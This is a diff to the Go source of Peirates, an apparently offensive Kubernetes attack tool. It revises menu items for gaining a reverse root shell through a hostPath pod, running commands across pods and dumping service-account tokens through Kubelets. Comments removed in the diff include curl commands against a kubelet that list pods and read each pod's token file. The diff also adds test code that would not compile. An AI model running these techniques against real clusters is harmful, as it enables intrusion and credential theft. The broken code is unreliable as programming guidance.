@@ -1057,13 +1057,17 @@ Steal Service Accounts   |
 -----------+
 Compromise |
 -----------+
-[20] Gain a reverse rootshell by launching a hostPath / pod
-[21] Run command in one or all pods in this namespace
-[22] Request all Kubelets run a token-dumping command in all pods
+[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod
+[21] Run command in one or all pods in this namespace via the API Server (RBAC permitting)
+[22] Run a token-dumping command in all pods via Kubelets (authorization/Webhook permitting)
+
 
 [exit] Exit Peirates 
 ----------------------------------------------------------------
 Peirates:># `)
+
+// [23] Run a command in a pod via its node's Kubelet (authorization/Webhook permitting)
+
 
 		// Banner items to implement
 
@@ -1076,6 +1080,17 @@ Peirates:># `)
 		// Pull Kubernetes service account tokens from S3 [AWS only] [not yet implemented]
 		// Shell out to bash (not yet implemented)
 		// Build YAML Files (not yet implemented)
+
+		// Testing http_utils GetRequest(url,headers,tls_checking)
+
+		myurl_1 := "http://10.23.58.41:10255/pods"
+		headers := {
+			
+		}
+		// myurl_2 = "https://127.0.0.1"
+		for line, _ := range GetRequest(url, headers, false) {
+			println(line)
+		}
 
 		var input string
 		var user_response string
@@ -1570,20 +1585,9 @@ Peirates:># `)
 				}
 
 			}
-		// [22] Get a list of pods from the Kubelet [not yet implemented]
+		// [22] Use the kubelet to gain the token in every pod where we can run a command
 		case "22":
-			// Use kubectl get nodes to get a list of nodes
-			// ---->  GetNodesInfo(connectionString)
-			// Use kubectl get node _name_ -o yaml to get IP addresses
 			ExecuteCodeOnKubelet(connectionString, &serviceAccounts)
-			// Find a line that matches - address: IP
-			// curl port 10255 to get pods: curl -sk http://10.23.58.41:10255/pods
-
-			// FAITH working here: Parse the Json to get pod and container names
-
-			// curl port 10250 to run commands:
-			// curl -sk https://10.23.58.41:10250/run/namespace/pod/container/ \
-			// -d "cmd=cat /run/secrets/kubernetes.io/serviceaccount/token"
 		case "98":
 			break
 		case "99":
